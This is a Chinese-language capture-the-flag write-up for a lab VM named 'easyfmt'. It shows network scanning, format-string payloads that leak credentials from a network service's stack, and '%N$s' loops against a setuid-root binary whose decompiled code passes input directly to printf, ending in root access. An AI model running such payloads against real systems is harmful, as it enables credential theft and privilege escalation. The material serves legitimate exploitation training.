![image-20250620183907687](https://raw.githubusercontent.com/7r1UMPH/7r1UMPH.github.io/main/static/image/20250620183915120.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo arp-scan -l           
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:f8:ba:aa       VMware, Inc.
192.168.205.139 08:00:27:7c:4c:12       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fd:86:ce       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.063 seconds (124.09 hosts/sec). 4 responded
                                   
```

139的ip，进行服务探测

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -p- 192.168.205.139                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 06:40 EDT
Nmap scan report for 192.168.205.139
Host is up (0.00016s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
MAC Address: 08:00:27:7C:4C:12 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.21 seconds
 
```

有个1337端口，nc上去瞄一眼

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nc 192.168.205.139 1337 
welcome:Where is my password?
root:Well,it's in the stack,just find it.
```

翻译一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo "welcome:Where is my password?                  
root:Well,it's in the stack,just find it." | trans -b :zh 2>/dev/null
欢迎：我的密码在哪里？
root：嗯，它在堆栈中，只是找到它。
           
```

提示 堆栈

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nc 192.168.205.139 1337 
welcome:Where is my password?
root:Well,it's in the stack,just find it.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

丢了亿点A过去，回显没价值，**栈溢出**暂时无果

然后就试了一下**格式化字符串**

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nc 192.168.205.139 1337
welcome:Where is my password?
root:Well,it's in the stack,just find it.
%p.%p.%p.%p.%p.%p
0x1afc2a1.(nil).0x1afc2b2.0x7ffd9c94ced0.0x7ff5d0eb2be0.0x70252e70252e7025

```

找到了，拿脚本爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ for i in $(seq 1 40); do echo -n "$i\n"
pa=$(python3 -c "print('.'.join(['%p'] * $i))")
echo "$pa" | nc -w 1 192.168.205.139 1337 | tail -n 1
done
1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22
0xf472a1.(nil).(nil).0x7ffd4ea8b960.0x7f08e27a0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f08e25f5d7a.0x7ffd4ea8bab8.0x14ea8bc89.
23
0x21f62a1.(nil).(nil).0x7fff4c072100.0x7f0958737be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f095858cd7a.0x7fff4c072258.0x14c072429.
24
0x135f2a1.(nil).(nil).0x7ffce42da9e0.0x7f908d69abe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f908d4efd7a.0x7ffce42dab38.0x1e42dad09.
25
0x1b9f2a1.(nil).(nil).0x7ffdc9ef61f0.0x7f8a23246be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f8a2309bd7a.0x7ffdc9ef6348.0x1c9ef6519.
26
0x10472a1.(nil).(nil).0x7fff6159ddc0.0x7f4e89dc1be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f4e89c16d7a.0x7fff6159df18.0x16159e0e9.
27
0x1de52a1.(nil).(nil).0x7fff75c854d0.0x7ff45c50bbe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7ff45c360d7a.0x7fff75c85628.0x175c857f9.
28
0xbe52a1.(nil).(nil).0x7ffe4fd2f9b0.0x7f5fc99e8be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f5fc983dd7a.0x7ffe4fd2fb08.0x14fd2fcd9.
29
0x1b822a1.(nil).(nil).0x7fffc7c06ac0.0x7f3e6f018be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f3e6ee6dd7a.0x7fffc7c06c18.0x1c7c06de9.
30
0x176f2a1.(nil).(nil).0x7ffd196b6bd0.0x7f79cf143be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f79cef98d7a.0x7ffd196b6d28.0x1196b6ef9.
31
0x1b242a1.(nil).(nil).0x7ffe081aeea0.0x7f978cae5be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f978c93ad7a.0x7ffe081aeff8.0x1081af1c9.
32
0x1f1c2a1.(nil).(nil).0x7ffe621be420.0x7f9d098d9be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f9d0972ed7a.0x7ffe621be578.0x1621be749.
33
0x191c2a1.(nil).(nil).0x7ffc5b7e0190.0x7f5c090fabe0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f5c08f4fd7a.0x7ffc5b7e02e8.0x15b7e04b9.
34
0x1e482a1.(nil).(nil).0x7ffd2f19fc30.0x7ff602059be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7ff601eaed7a.0x7ffd2f19fd88.0x12f19ff59.
35
0x19452a1.(nil).(nil).0x7ffd038568d0.0x7f2a117a8be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f2a115fdd7a.0x7ffd03856a28.0x103856bf9.
36
0xd592a1.(nil).(nil).0x7ffde1f69190.0x7f8e3bbc2be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f8e3ba17d7a.0x7ffde1f692e8.0x1e1f694b9.
37
0x126a2a1.(nil).(nil).0x7ffe821c3800.0x7f492e554be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f492e3a9d7a.0x7ffe821c3958.0x1821c3b29.
38
0x9dc2a1.(nil).(nil).0x7ffd0117d1e0.0x7fb8ec1b4be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7fb8ec009d7a.0x7ffd0117d338.0x10117d509.
39
0x10c22a1.(nil).(nil).0x7ffdd856fdc0.0x7fd5d4155be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7fd5d3faad7a.0x7ffdd856ff18.0x1d85700e9.
40
0x8e82a1.(nil).(nil).0x7ffd3af08f60.0x7f34bfca0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f.(nil).0x401210.0x7f34bfaf5d7a.0x7ffd3af090b8.0x13af09289.

```

随便拿一行处理一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ echo "0x7ffd3af08f60.0x7f34bfca0be0.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x2e70252e70252e.0x3a656d6f636c6577.0x746e34635f753059.0x336d5f646e31665f" | sed 's/0x//g; s/\./\n/g'|while read line; do echo "$line" | xxd -r -p 2>/dev/null |rev 2>/dev/null;done
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.welcome:Y0u_c4nt_f1nd_m3                                                                                     
```

welcome:Y0u_c4nt_f1nd_m3

```
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ssh welcome@192.168.205.139
The authenticity of host '192.168.205.139 (192.168.205.139)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    (6 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.139' (ED25519) to the list of known hosts.
welcome@192.168.205.139's password: 
Linux easyfmt 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun 18 09:56:53 2025 from 192.168.43.21
welcome@easyfmt:~$ id
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
```

找

```
welcome@easyfmt:~$ ls -al
total 44
drwx------ 3 welcome welcome 4096 Jun 17 10:53 .
drwxr-xr-x 3 root    root    4096 Apr 11 22:27 ..
lrwxrwxrwx 1 root    root       9 Jun 15 08:24 .bash_history -> /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11 22:27 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11 22:27 .bashrc
drwxr-xr-x 4 welcome welcome 4096 Jun 17 00:58 .cache
-rw------- 1 root    root       2 Jun 15 08:59 .gdb_history
-rw-r--r-- 1 welcome welcome  807 Apr 11 22:27 .profile
-rw-r--r-- 1 welcome welcome  682 Jun 17 07:39 server.c
-rw-r--r-- 1 root    root      44 Jun 17 10:40 user.txt
-rw------- 1 welcome welcome 8187 Jun 17 10:53 .viminfo
welcome@easyfmt:~$ cat user.txt 
flag{user-a0f6b8f4de02df56f52e55bcdded458c}
welcome@easyfmt:~$ sudo -l
sudo: unable to resolve host easyfmt: Name or service not known
[sudo] password for welcome: 
Sorry, user welcome may not run sudo on easyfmt.
welcome@easyfmt:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/opt/vuln
welcome@easyfmt:~$ cd /opt/
welcome@easyfmt:/opt$ ls -al
total 52
drwxr-xr-x  3 root    root     4096 Jun 18 09:51 .
drwxr-xr-x 18 root    root     4096 Mar 18 20:37 ..
drwxr-xr-x  6 root    root     4096 Dec 31  1969 pwndbg
-rwxr-xr-x  1 welcome welcome 16696 Jun 17 07:39 server
-rwsr-xr-x  1 root    root    17104 Jun 18 09:51 vuln
welcome@easyfmt:/opt$ strings vuln 
/lib64/ld-linux-x86-64.so.2
mgUa
setuid
exit
perror
puts
stdin
printf
fgets
read
malloc
open
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
/root/pass.txt
open
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
vuln.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@GLIBC_2.2.5
stdin@GLIBC_2.2.5
_edata
printf@GLIBC_2.2.5
read@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
malloc@GLIBC_2.2.5
__bss_start
main
setgid@GLIBC_2.2.5
open@GLIBC_2.2.5
perror@GLIBC_2.2.5
exit@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@GLIBC_2.2.5
__cxa_finalize@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

拉过来，丢去ida

```
int __fastcall main(int argc, const char **argv, const char **envp)
{
char s[68]; // [rsp+10h] [rbp-50h] BYREF
int fd; // [rsp+54h] [rbp-Ch]
void *buf; // [rsp+58h] [rbp-8h]
setuid(0);
setgid(0);
buf = malloc(0x18uLL);
fd = open("/root/pass.txt", 0);
if ( fd < 0 )
{
perror("open");
exit(1);
}
puts("welcome:I have found mine.Then,where is your password?");
puts("root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.");
puts("welcome:Hahahaha,let's try:");
read(fd, buf, 0x18uLL);
fgets(s, 6, stdin);
printf(s);
return 0;
}
```

他直接把输入的字符串s当作printf的参数了

所以继续

```
welcome@easyfmt:/opt$ for i in $(seq 1 20);do
> p="/opt/vuln"
> pa="%$i\$s"
> echo "'$pa'"
> echo "$pa" | $p
> done
'%1$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%2$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
(null)
'%3$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:

'%4$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
%4$s

'%5$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
�f!�[U
'%6$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
,�^@�
'%7$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%8$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%9$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%10$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
'%11$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
H��H9�u�H�[]A\A]A^A_�'%12$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
(null)'%13$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
(null)'%14$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
AWL�=?+'%15$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
1�I��^H��H���PTL�
'%16$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Segmentation fault
'%17$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
Y0u_4r3_S0_Gr34t!
'%18$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
AWL�=?+'%19$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
���y'%20$s'
welcome:I have found mine.Then,where is your password?
root:Mine is not so easy to get.It's in heap.But you can only input 6 chars now.
welcome:Hahahaha,let's try:
```

Y0u_4r3_S0_Gr34t!

```
welcome@easyfmt:/opt$ su -
Password: 
root@easyfmt:~# id
uid=0(root) gid=0(root) groups=0(root)
root@easyfmt:~# cat /root/root.txt 
flag{root-8a6fbe864f3154b901643b4943980d5e}
```

